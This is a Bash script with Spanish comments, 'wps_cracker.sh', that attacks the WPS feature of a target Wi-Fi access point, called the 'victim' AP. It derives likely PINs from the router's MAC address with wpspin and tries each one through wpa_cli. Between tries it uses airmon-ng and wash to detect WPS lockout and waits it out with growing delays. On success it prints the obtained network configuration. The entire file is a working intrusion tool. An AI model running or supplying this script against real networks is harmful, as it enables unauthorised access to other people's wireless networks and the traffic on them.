#!/usr/bin/env bash
# Uso: ./wps_cracker.sh [iface] [AP_MAC]
# Por defecto: ./wps_cracker.sh wlan4 02:00:00:00:00:00

IFACE_MON="wlan4mon"                # Interfaz en modo monitor (valor por defecto)
IFACE="${1:-wlan4}"                 # Interfaz inalámbrica (argumento o valor por defecto)
BSSID="${2:-02:00:00:00:00:00}"     # MAC del punto de acceso victima (argumento o valor por defecto)
SLEEP_TIME=30

# Comprueba si 
# return 0 -> locked
# return 1 -> unlocked
# exit 21 -> desconocido / AP no listado (error)
is_wps_locked() {
  LOCKED=$(
    timeout 10s wash -i "$IFACE_MON" 2>/dev/null \
    | awk -v b="$BSSID" '
        BEGIN{IGNORECASE=1}
        # 1ª col = BSSID; 5ª col = Locked (Yes/No)
        $1 ~ /^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$/ && toupper($1)==toupper(b) {
          print $5; exit
        }'
  )

  case "${LOCKED,,}" in
    yes|true|1) return 0 ;; # locked
    no|false|0) return 1 ;; # unlocked
    *)          return 2 ;; # error
  esac
}

# Comprobar argumentos
if [ $# -gt 2 ]; then
    echo "[?] Uso: $0 [IFACE] [BSSID]"
    echo "[?] Parametros por defecto: $0 wlan4 02:00:00:00:00:00"
    exit 1
fi

if ! ip link show "$IFACE" &>/dev/null; then
    echo "[!] Error: la interfaz '$IFACE' no existe."
    exit 1
fi

if [[ ! "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
    echo "[!] Error: '$BSSID' no es una MAC valida."
    exit 1
fi

# Calcular las claves segun la direccion MAC
mapfile -t PINS < <(
  wpspin -A "$BSSID" |
  awk -F'[[:space:]]*\\|[[:space:]]*' 'NR>1 && $1 != "<empty>" {print $1}' |
  awk '/^[0-9]{8}$/' |
  awk '!seen[$0]++'
)

# Recorre la lista de claves probando cada una
for KEY in "${PINS[@]}"; do
    airmon-ng start "$IFACE" 2>&1 |
    IFACE_MON=$(
        awk '/monitor mode (vif )?enabled/ {
            iface=$NF
            gsub(/^\[[^]]+\]/,"", iface)      # quita [phyXX]
            gsub(/[)[:space:]]+$/,"", iface)  # quita ) y espacios al final
            print iface; exit
        }'
    )

    echo "[+] Interfaz '$IFACE' cambiando a modo monitor bajo el nombre '$IFACE_MON' para observar el estado del punto de acceso WPS"

    # Comprobar que el AP con WPS no esté bloqueado (puede bloquearse por repetidos intentos de conexion)
    while true; do
    is_wps_locked
    IS_LOCKED=$?

        case "$IS_LOCKED" in
            0)  echo "[-] Punto de acceso WPS bloqueado, esperando hasta que se desbloquee ($SLEEP_TIME s)"; sleep $SLEEP_TIME; (( SLEEP_TIME += SLEEP_TIME )) ;;
            1)  break ;;
            *)  echo "[!] Error al observar el estado del punto de acceso, por favor compruebe la conexion si el error persiste (se vuelve a probar)." ;;
        esac
    done

    airmon-ng stop "$IFACE_MON" > /dev/null 2>&1

    echo "[-] Interfaz '$IFACE_MON' volviendo al modo managed como '$IFACE'"

    # Reiniciar herramienta de conexión WiFi con la siguiente clave
    echo "[+] Probando clave $KEY..."
    #pkill wpa_supplicant > /dev/null 2>&1
    #sleep 1
    wpa_supplicant -i "$IFACE" -c wpa_supplicant.conf -B > /dev/null 2>&1
    wpa_cli -i "$IFACE" wps_reg "$BSSID" "$KEY" > /dev/null 2>&1

    # Esperar hasta que acepte o deniegue la clave probada (stado = SCANNING)
    while true; do
        STATE="$(wpa_cli -i "$IFACE" status 2>/dev/null | awk -F= '$1=="wpa_state"{print $2}')"
        
        if [ "$STATE" != "SCANNING" ]; then
            break
        fi

        sleep 5
    done

    if [ "$STATE" == "COMPLETED" ]; then
        # Imprimir clave si es correcta y salir 
        echo "[+] Clave $KEY correcta. Detalles de la conexión:"
        cat wpa_supplicant.conf
        exit 0
    else 
        # Si es incorrecta mostrarlo y probar la siguiente
        echo "[-] Clave $KEY incorrecta."
        echo "[-] Esperando $SLEEP_TIME s para evitar bloqueos."
        sleep $SLEEP_TIME
    fi

done

# En caso de haber probado todas las claves sin exito se emite un mensaje de error
echo "[!] No se ha encontrado ninguna clave que de acceso, intentelo de nuevo para descartar que el problema se deba a alguna interferencia."
